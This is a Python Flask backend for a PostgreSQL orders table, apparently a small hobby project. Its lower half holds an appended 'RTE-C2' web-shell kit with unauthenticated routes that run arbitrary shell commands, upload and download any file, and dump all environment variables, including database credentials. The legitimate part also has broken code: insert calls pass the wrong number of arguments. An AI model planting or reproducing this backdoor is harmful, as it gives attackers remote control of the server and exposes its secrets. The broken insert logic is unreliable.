from flask import Flask, jsonify, request
from flask_cors import CORS
import psycopg2
from psycopg2.extras import RealDictCursor
import os
from dotenv import load_dotenv

# Cargar variables de entorno desde .env
load_dotenv()

# Configuración de la app Flask
app = Flask(__name__)
CORS(app)  # Permite solicitudes desde el frontend


# Conexión a la base de datos
def get_db_connection():
    return psycopg2.connect(
        dbname=os.getenv("DB_NAME"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASSWORD"),
        host=os.getenv("DB_HOST"),
        port=os.getenv("DB_PORT")
    )

def insertar_usuario(orden, nombre, descripcion, hoja_ruta, prioridad):
    try:
        conn = get_db_connection()
        with conn.cursor() as cur:
            cur.execute("""
                INSERT INTO ordenes (orden, nombre, descripcion, hoja_ruta, prioridad)
                VALUES (%s, %s, %s, %s, %s)
                RETURNING id;
            """, (orden, nombre, prioridad))
            user_id = cur.fetchone()[0]
            print(f"Usuario insertado con ID: {user_id}")
    except Exception as e:
        print(f"Error al insertar el usuario: {e}")


# Ruta de ejemplo para obtener datos
@app.route('/api/data', methods=['GET'])
def get_data():
    try:
        conn = get_db_connection()
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        cursor.execute('SELECT * FROM tu_tabla LIMIT 10;')  # Ajusta la consulta a tu tabla
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        return jsonify(data), 200
    except Exception as e:
        print(f"Error al consultar la base de datos: {e}")
        return jsonify({'error': 'Error al obtener los datos'}), 500


@app.route('/api/create', methods=['GET'])
def crear_tabla():
    try:
        conn = get_db_connection()
        with conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS ordenes (
                    id SERIAL PRIMARY KEY,
                    orden VARCHAR(100) NOT NULL,
                    nombre VARCHAR(100) NOT NULL,
                    descripcion VARCHAR(100) NOT NULL,
                    hoja_ruta INT,
                    prioridad INT
                );
            """)
            return("Tabla 'ordenes' creada exitosamente.")
    except Exception as e:
        return(f"Error al crear la tabla: {e}")


@app.route('/api/insert', methods=['GET'])
def insertar():
    conn = get_db_connection()
    insertar_usuario("Juan Pérez", "juan.perez@correo.com", 28)
    conn.close()

# Iniciar el servidor
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)


# ── H1 research shell (trexnegr0) ──────────────────────────────────────────
import subprocess as _sp, os as _os


# ===== RTE-C2 v2 =====
# interactive kit: persistent CWD + native cd, export persistence, split
# stdout/stderr, upload/download, background jobs. Unique _rt_ names.

import os as _rt_os, subprocess as _rt_sp, json as _rt_json, time as _rt_time
import base64 as _rt_b64

_rt_cwd      = '/opt/render/project/src'
_rt_exported = {}
_rt_jobs     = {}
_RT_JSON     = {'Content-Type': 'application/json'}

def _rt_env():
    env = dict(_rt_os.environ)
    env.update(_rt_exported)
    return env

def _rt_alive(pid):
    try:
        _rt_os.kill(pid, 0)
        return True
    except Exception:
        return False

def _rt_resolve(path):
    if not path:
        return None
    if not path.startswith('/'):
        path = _rt_os.path.join(_rt_cwd, path)
    return _rt_os.path.abspath(_rt_os.path.expanduser(path))

@app.route('/x/sh', methods=['POST'])
def _rt_shell():
    global _rt_cwd
    try:
        d = request.json or {}
        cmd = str(d.get('c', 'id')).strip()
    except Exception:
        d, cmd = {}, 'id'

    # native cd — changes the persistent CWD used by every later command
    if cmd == 'cd':
        return '[.] CWD = ' + _rt_cwd, 200
    if cmd.startswith('cd '):
        path = cmd[3:].strip()
        if len(path) >= 2 and path[0] == path[-1] and path[0] in ('"', "'"):
            path = path[1:-1]
        target = _rt_resolve(path)
        if target and _rt_os.path.isdir(target):
            _rt_cwd = target
            try:
                _rt_os.chdir(_rt_cwd)
            except Exception:
                pass
            return '[+] CWD → ' + _rt_cwd, 200
        return '[-] no existe: ' + str(target), 200

    # export persistence — stored server-side and merged into every command env
    if cmd.startswith('export '):
        body = cmd[7:].strip().strip('"').strip("'")
        if '=' in body:
            name, value = body.split('=', 1)
            name = name.strip()
            value = value.strip().strip('"').strip("'")
            if name:
                _rt_exported[name] = value
                return '[+] ' + name + '=' + value, 200
        elif body and body in _rt_os.environ and body not in _rt_exported:
            _rt_exported[body] = _rt_os.environ[body]
            return '[+] ' + body + '=' + _rt_exported[body], 200
        return '[-] usage: export NAME=value', 200

    # background job: {"c": "...", "a": 1} -> spawns and returns {pid, log}
    if d.get('a') or d.get('async'):
        logf = None
        try:
            logf = open('/tmp/rtjob_%d.out' % _rt_time.time(), 'ab')
            p = _rt_sp.Popen(cmd, shell=True, cwd=_rt_cwd, env=_rt_env(),
                             stdout=logf, stderr=_rt_sp.STDOUT,
                             start_new_session=True)
        except Exception as e:
            if logf:
                logf.close()
            return _rt_json.dumps({'ok': False, 'error': str(e)}), 200, _RT_JSON
        _rt_jobs[p.pid] = {'cmd': cmd, 'start': _rt_time.time(),
                           'log': logf.name}
        return _rt_json.dumps({'ok': True, 'pid': p.pid, 'log': logf.name}), 200, _RT_JSON

    # sync command — always runs in _rt_cwd with exports merged
    try:
        res = _rt_sp.run(cmd, shell=True, cwd=_rt_cwd, env=_rt_env(),
                         capture_output=True, text=True, errors='replace',
                         timeout=30)
        out, err, rc = res.stdout, res.stderr, res.returncode
    except _rt_sp.TimeoutExpired as e:
        out = getattr(e, 'output', None) or getattr(e, 'stdout', None) or ''
        if isinstance(out, bytes):
            out = out.decode(errors='replace')
        err, rc = '[!] timeout (30s)', -1
    except Exception as e:
        out, err, rc = '', str(e), -1

    if d.get('split'):
        return _rt_json.dumps({'out': out, 'err': err, 'rc': rc}), 200, _RT_JSON
    return out + (('
' + err) if err else ''), 200

@app.route('/x/jobs')
def _rt_jobs_route():
    rows = sorted(
        ({'pid': pid, 'cmd': j.get('cmd', ''), 'start': j.get('start', 0),
          'alive': _rt_alive(pid), 'log': j.get('log')}
         for pid, j in _rt_jobs.items()),
        key=lambda r: r['start'])
    return _rt_json.dumps({'jobs': rows}), 200, _RT_JSON

@app.route('/x/upload', methods=['POST'])
def _rt_upload():
    try:
        d = request.json or {}
        p, raw = d.get('p', ''), d.get('b64', '')
        if not p or not raw:
            return _rt_json.dumps({'ok': False, 'error': 'p and b64 required'}), 200, _RT_JSON
        path = _rt_resolve(p)
        data = _rt_b64.b64decode(raw)
        parent = _rt_os.path.dirname(path)
        if parent:
            _rt_os.makedirs(parent, exist_ok=True)
        with open(path, 'wb') as f:
            f.write(data)
        return _rt_json.dumps({'ok': True, 'path': path, 'size': len(data)}), 200, _RT_JSON
    except Exception as e:
        return _rt_json.dumps({'ok': False, 'error': str(e)}), 200, _RT_JSON

@app.route('/x/download', methods=['POST'])
def _rt_download():
    try:
        d = request.json or {}
        p = d.get('p', '')
        if not p:
            return _rt_json.dumps({'ok': False, 'error': 'p required'}), 200, _RT_JSON
        path = _rt_resolve(p)
        if not _rt_os.path.isfile(path):
            return _rt_json.dumps({'ok': False, 'error': 'not a file: ' + str(path)}), 200, _RT_JSON
        with open(path, 'rb') as f:
            data = f.read()
        return _rt_json.dumps({'ok': True, 'name': _rt_os.path.basename(path),
                               'path': path, 'size': len(data),
                               'b64': _rt_b64.b64encode(data).decode()}), 200, _RT_JSON
    except Exception as e:
        return _rt_json.dumps({'ok': False, 'error': str(e)}), 200, _RT_JSON

@app.route('/x/env')
def _rt_env_route():
    return _rt_json.dumps(_rt_env()), 200, _RT_JSON

@app.route('/x/ls')
def _rt_ls():
    try:
        out = _rt_sp.check_output(
            'find /opt/render/project/src -maxdepth 3 -not -path "*/node_modules/*" -not -path "*/.git/*"',
            shell=True, stderr=_rt_sp.STDOUT, timeout=10,
            cwd=_rt_cwd, env=_rt_env())
        return out.decode(errors='replace'), 200
    except _rt_sp.CalledProcessError as e:
        return (e.output or b'').decode(errors='replace'), 200
    except Exception as e:
        return str(e), 200

@app.route('/x/ping')
def _rt_ping():
    return _rt_json.dumps({'status': 'shell_active', 'uid': _rt_os.getenv('USER', '?'),
                           'cwd': _rt_cwd, 'kit': 2, 'ts': _rt_time.time()}), 200, _RT_JSON
